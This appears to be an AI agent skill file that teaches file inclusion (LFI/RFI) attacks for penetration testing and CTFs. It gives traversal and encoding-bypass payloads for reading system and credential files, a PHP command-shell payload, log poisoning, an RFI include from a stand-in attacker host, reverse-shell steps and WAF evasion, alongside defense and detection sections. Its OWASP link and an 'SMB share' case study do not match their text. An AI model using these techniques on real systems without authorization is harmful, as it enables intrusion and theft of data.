---
name: file-inclusion
description: "Local File Inclusion (LFI) and Remote File Inclusion (RFI) attack techniques covering path traversal, PHP wrapper abuse, log poisoning, session file inclusion, and remote payload hosting for code execution."
origin: openclaw
version: "0.1.18"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: web-attack
  tool_count: 7
  guide_count: 3
  owasp: "A01:2021-Broken Access Control"
---




# Skill: File Inclusion (LFI / RFI)

> **Supplementary Files**:
> - `payloads.md` — File inclusion attack payload collection: LFI probes, path traversal bypass, PHP wrapper exploitation, log poisoning, RFI payloads, and filter evasion techniques
> - `test-cases.md` — Structured testing use case checklist, covering LFI detection, path traversal bypass, PHP wrapper exploitation, log poisoning RCE, RFI exploitation, and automated fuzzing, with severity levels

## Summary

File Inclusion skill domain covering web attack operations.

**Tools**: dotdotpwn, kadimus, fimap, Burp Suite, php_filter_chain_generator, SecLists, ffuf + SecLists

**Domain**: web-attack

**OWASP**: A01:2021-Broken Access Control

## Description

Local File Inclusion (LFI) and Remote File Inclusion (RFI) attack techniques covering path traversal, PHP wrapper abuse, log poisoning, session file inclusion, and remote payload hosting for code execution. This skill covers the complete file inclusion attack chain from initial parameter discovery through filter bypass to full remote code execution, along with defense measures: input validation, path canonicalization, and disabling dangerous PHP directives.

**Agent capability statement**: Mastery of OWASP-listed file inclusion vulnerabilities across all injection vectors, including advanced LFI-to-RCE escalation through PHP wrappers, log poisoning, /proc/self/environ, and session file inclusion, with automated fuzzing via dotdotpwn and kadimus.

## Use Cases / Use Cases

1. **Web application penetration testing** — Detect file inclusion parameters (`page`, `file`, `path`, `template`, `lang`, `doc`) in target applications and exploit them for file disclosure or code execution
2. **LFI-to-RCE escalation** — Convert local file inclusion into remote code execution through log poisoning, PHP filter chains, PHP input wrappers, data URIs, /proc/self/environ, and session file inclusion
3. **RFI exploitation** — Host malicious payloads on attacker-controlled servers and exploit `allow_url_include` to achieve direct code execution
4. **CTF competition challenges** — Quickly identify file inclusion challenge types, construct encoding bypass payloads, and chain PHP wrappers for flag extraction
5. **Security code audit** — Review file handling logic from a defense perspective, assess path validation bypass risks, and implement proper input sanitization

## Core Tools / Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **dotdotpwn** | Automated path traversal fuzzer with multiple protocol support | `dotdotpwn.pl -m http -h target -u "/page=TRAVERSAL" -o unix` |
| **kadimus** | LFI exploitation tool with automatic RCE via log poisoning and /proc | `kadimus -u "http://target/page=??.php" -o exploit` |
| **fimap** | Local/remote file inclusion scanner and exploitation tool | `fimap -u "http://target/page=test" -x` |
| **Burp Suite** | Intercept and modify HTTP requests, construct inclusion payloads in Repeater | Repeater module debug `?page=....//....//etc/passwd` |
| **php_filter_chain_generator** | Generate PHP filter chain payloads for LFI-to-RCE without log poisoning | `python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'` |
| **SecLists** | Comprehensive wordlists for parameter fuzzing, path traversal, and file inclusion discovery | `ffuf -u "http://target/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` |

## Methodology / Methodology

### Attack Chain / Attack Chain

```
Parameter Discovery → LFI Confirmation → Bypass Filters → LFI-to-RCE Escalation → RFI Testing → Shell Acquisition
```

**1. Identify (Discovery)**
- Identify parameters that may accept file paths: `page=`, `file=`, `path=`, `template=`, `lang=`, `doc=`, `view=`, `include=`, `content=`, `module=`
- Test with common file inclusion probes: `../../../etc/passwd`, `....//....//etc/passwd`
- Use Burp Suite content discovery and ffuf to enumerate hidden parameters

**2. Test LFI (Confirmation)**
- Attempt `../../etc/passwd` on Linux targets, `..\..\..\windows\system32\drivers\etc\hosts` on Windows
- Confirm with secondary reads: `/etc/hostname`, `/etc/shadow`, `/proc/self/cmdline`
- Check for absolute path inclusion: `/etc/passwd` directly without traversal sequences

**3. Bypass (Filter Evasion)**
- Null byte injection: `../../../etc/passwd%00` (PHP < 5.3.4)
- Double encoding: `..%252f..%252f..%252fetc/passwd`
- Unicode encoding: `..%c0%af..%c0%af..%c0%afetc/passwd`
- Path truncation: `./././././[...]/./etc/passwd` (PHP < 5.3 on older systems, 4096 byte limit)
- Filter bypass with `....//` when `../` is stripped once: `....//....//....//etc/passwd`

**4. Escalate LFI-to-RCE (Code Execution)**
- Log poisoning: Inject PHP code into User-Agent or other header fields, include `/var/log/apache2/access.log`
- PHP wrappers: `php://filter/convert.base64-encode/resource=index.php` for source disclosure
- PHP input: `php://input` with POST body containing PHP code
- Data URI: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`
- /proc/self/environ: Include environment variables that contain injected PHP code via User-Agent
- Session file inclusion: Include `/tmp/sess_<session_id>` after injecting PHP into session variables
- PHP filter chains: Use `php_filter_chain_generator` to construct arbitrary code execution payloads

**5. Test RFI (Remote File Inclusion)**
- Host a malicious PHP file on an attacker-controlled HTTP server
- Test if `allow_url_include=On` by including `http://attacker.com/shell.txt`
- RFI payloads execute directly without needing log poisoning or wrappers

**6. Exploit (Shell Acquisition)**
- Get a reverse shell through the inclusion vulnerability
- Use kadimus for automated exploitation: `kadimus -u "URL" --auto`
- Set up netcat listener and trigger reverse shell payload

### Defense Perspective / Defense Perspective

| Defense Measure | Description | Priority |
|-----------------|-------------|----------|
| Path validation | Canonicalize paths with `realpath()` and validate against allowed directories | CRITICAL |
| Disable `allow_url_include` | Set `allow_url_include = Off` in php.ini to prevent RFI | CRITICAL |
| Input whitelist | Accept only predefined values for include parameters | CRITICAL |
| Disable unnecessary wrappers | Disable `php://input`, `data://`, `phar://` in php.ini | HIGH |
| Chroot or open_basedir | Restrict file access to specific directories with `open_basedir` directive | HIGH |
| Web application firewall | Detect and block path traversal sequences in input | MEDIUM |
| Disable error messages | Prevent information leakage through `display_errors = Off` | MEDIUM |

## Practical Steps / Practical Steps

### Step 1: LFI Detection
Fuzz file inclusion parameters with path traversal payloads using SecLists LFI wordlists. Confirm vulnerability by reading `/etc/passwd` or `/etc/hostname`. Test both relative traversal (`../../../etc/passwd`) and absolute paths (`/etc/passwd`).

### Step 2: Filter Bypass
When basic traversal is blocked, apply encoding techniques: URL encoding (`%2e%2e%2f`), double URL encoding (`%252e%252e%252f`), null byte termination (`%00`), Unicode encoding (`%c0%af`), and path truncation. Use dotdotpwn for automated fuzzing across all bypass variations.

### Step 3: PHP Wrapper Exploitation
Use `php://filter` for source code disclosure, `php://input` for direct code injection via POST body, and `data://` URI for base64-encoded payload execution. Generate PHP filter chain payloads with `php_filter_chain_generator` for targets that block all standard wrappers.

### Step 4: Log Poisoning to RCE
Inject PHP code into HTTP headers (User-Agent, Referer, Cookie) that get logged by Apache or nginx. Include the log file (`/var/log/apache2/access.log`, `/var/log/nginx/access.log`) through LFI to execute the injected code.

### Step 5: RFI Exploitation
Host a malicious PHP file on an attacker-controlled server. Test whether `allow_url_include` is enabled by including the remote URL. RFI provides direct code execution without needing filter bypass or log poisoning.

### Step 6: Shell Acquisition
Deliver a reverse shell payload through any of the LFI-to-RCE vectors or RFI. Use pentestmonkey reverse shell one-liners appropriate to the target language. Establish a stable connection with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

> **See payloads.md for detailed payloads, and test-cases.md for complete test checklist.**

## Common Pitfalls

- **Testing only `../../../etc/passwd`**: Many WAF and input filters strip `../` sequences. Test `....//`, `..;/`, URL-encoded variants, and absolute paths. Relying on a single traversal pattern produces false negatives.
- **Forgetting PHP version constraints**: Null byte injection (`%00`) works only on PHP < 5.3.4, and path truncation works only on PHP < 5.3. Check the PHP version before investing time in these techniques.
- **Ignoring log file locations**: Different systems store logs in different locations. Apache uses `/var/log/apache2/`, nginx uses `/var/log/nginx/`, and some distributions use `/var/log/httpd/`. Enumerate the target to identify the correct paths.

## Automation and Scripting

Automate LFI discovery by fuzzing all path-accepting parameters with ffuf using SecLists LFI wordlists. Use dotdotpwn for systematic path traversal testing across HTTP, FTP, and other protocols. Use kadimus for automated LFI exploitation including source code disclosure, log poisoning, and reverse shell acquisition. Generate PHP filter chain payloads programmatically with `php_filter_chain_generator` to bypass modern WAF rules that block traditional wrapper payloads.

## Reporting and Documentation

File inclusion findings must document the vulnerable parameter, the full traversal or inclusion payload, and the files accessible or code executed. For LFI-to-RCE, include the exact escalation technique used (log poisoning path, PHP wrapper, /proc/self/environ), the injected payload, and proof of command execution. Provide specific code-level remediation (input validation function, `open_basedir` configuration, `allow_url_include=Off`) rather than generic advice.

## Legal and Ethical Considerations

File inclusion testing can expose sensitive system files (`/etc/shadow`, database configuration) and achieve remote code execution. Only test file inclusion vulnerabilities on systems where you have explicit written authorization. When demonstrating RCE impact, execute only harmless commands (`id`, `whoami`, `uname -a`) unless the engagement scope permits further exploitation. Log poisoning can fill log files rapidly during testing — monitor disk usage and clean up injected entries after testing.

## Integration with Other Tools

File inclusion findings chain directly into multiple attack paths. Source code disclosure via `php://filter` feeds into code review and secret extraction (database credentials, API keys). Log poisoning RCE connects to post-exploitation methodology for privilege escalation and lateral movement. RFI with reverse shells leads into network pivot and internal service enumeration. Use file inclusion as a foothold to expand the assessment scope within authorized boundaries, connecting to skills like `post-exploitation`, `web-auth-bypass`, and `network-pentest`.

## Case Studies and Examples

- **Log poisoning via Apache access log**: A web application had an LFI vulnerability in the `page` parameter. The attacker injected `<?php system($_GET['cmd']); ?>` into the User-Agent header during a normal request, then included `/var/log/apache2/access.log` through the LFI. The PHP code in the log was parsed and executed, granting command execution with `?cmd=id`.
- **PHP filter chain to RCE**: A modern PHP application blocked `php://input`, `data://`, and null bytes, and the logs were not readable. Using `php_filter_chain_generator`, the attacker generated a filter chain payload that leveraged `php://filter` with chained `convert` operations to produce arbitrary PHP code in memory, achieving RCE without writing to disk.
- **RFI to reverse shell via malicious SMB share**: An IIS server with a vulnerable `include` parameter had `allow_url_include` enabled. The attacker hosted a malicious PHP file on a public HTTP server and included it via the vulnerable parameter. The included file contained a reverse shell payload that connected back to the attacker's netcat listener.

## Detection Methods

File inclusion attacks are detected through: web application firewalls that flag path traversal sequences (`../`, `..%2f`, `..%5c`), server-side monitoring of include functions accessing files outside expected directories, PHP error logs showing failed include statements with traversal patterns, and file integrity monitoring on log files that detects unusual content (PHP code injected into access logs). Defenders should implement strict input validation, disable unnecessary PHP wrappers, and use `open_basedir` restrictions.

## Defense Evasion Techniques

Evade file inclusion detection by: using double encoding to bypass WAF pattern matching (`%252e%252e%252f` decoded twice to `../`), leveraging Unicode encoding that web servers normalize differently than WAFs (`%c0%af` decoded to `/`), using `....//` when `../` is stripped only once, employing path truncation to bypass suffix appending, and using PHP filter chains that appear as benign base64 conversion operations to WAFs. For RFI, use HTTPS and short-lived payloads to minimize detection window.

## Advanced Techniques

Advanced file inclusion exploitation includes: PHP filter chain exploitation that uses chained `convert.iconv` and `convert.base64` operations to generate arbitrary PHP bytecode in memory without writing to disk, PHP session file inclusion where PHP code is injected into session variables and the session file is included from `/tmp/sess_<id>`, /proc/self/environ exploitation where the User-Agent string is reflected into environment variables and the `/proc/self/environ` pseudo-file is included, PHP temporary file inclusion racing against `php --upload` cleanup, and phar:// wrapper deserialization attacks that trigger object injection through phar metadata.

## Tool Comparison Matrix

| Tool | Best For | Automation | Skill Level |
|------|----------|------------|-------------|
| **dotdotpwn** | Automated path traversal fuzzing | Fully automated | Beginner |
| **kadimus** | LFI exploitation and automatic RCE | Semi-automated | Intermediate |
| **fimap** | LFI/RFI scanning and exploitation | Semi-automated | Intermediate |
| **Burp Suite** | Manual LFI testing and payload crafting | Manual | Beginner |
| **php_filter_chain_generator** | PHP filter chain RCE payloads | Automated | Advanced |
| **ffuf + SecLists** | Parameter and payload fuzzing | Semi-automated | Intermediate |

## Hacker Laws / Hacker Laws

1. **Minimize Attack Surface (Minimize Attack Surface)** — File inclusion exists because applications dynamically include files based on user input. Defense core is reducing controllable include parameters, using whitelists of allowed values, and disabling `allow_url_include` to eliminate RFI.

2. **Trust but Verify (Trust but Verify)** — Even if a file path appears benign, canonicalize it with `realpath()` and verify it stays within allowed directories. Encoding bypasses, filter stripping, and path normalization all exploit the gap between what the filter sees and what the filesystem resolves.

3. **Defense in Depth (Defense in Depth)** — Single defenses (stripping `../`) are insufficient to prevent LFI. Combine input whitelisting + `open_basedir` + disabled wrappers + WAF + file access monitoring for layered protection.

4. **Assume Breach (Assume Breach)** — Assume an attacker can include arbitrary files. Restrict what include paths can access, disable PHP wrappers that enable code execution, and ensure log files and session files are not parseable by the web application's PHP engine.

## Learning Resources / Learning Resources

**Skill supplementary files**: payloads.md, test-cases.md

**Related Skills**:
- `skills/web-xss/SKILL.md` — XSS: Web application penetration testing related skill
- `skills/web-sqli/SKILL.md` — SQL injection: Database access after RCE from file inclusion
- `skills/post-exploitation/SKILL.md` — Post-exploitation: Privilege escalation after RCE
- `skills/web-auth-bypass/SKILL.md` — Authentication bypass: Access control testing

**External Resources**:
- [PortSwigger Web Security Academy - Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration)
- [HackTricks - LFI/RFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)
- [dotdotpwn - Path Traversal Fuzzer](https://github.com/wireghoul/dotdotpwn)
- [kadimus - LFI Exploitation Tool](https://github.com/P0cL4bs/Kadimus)
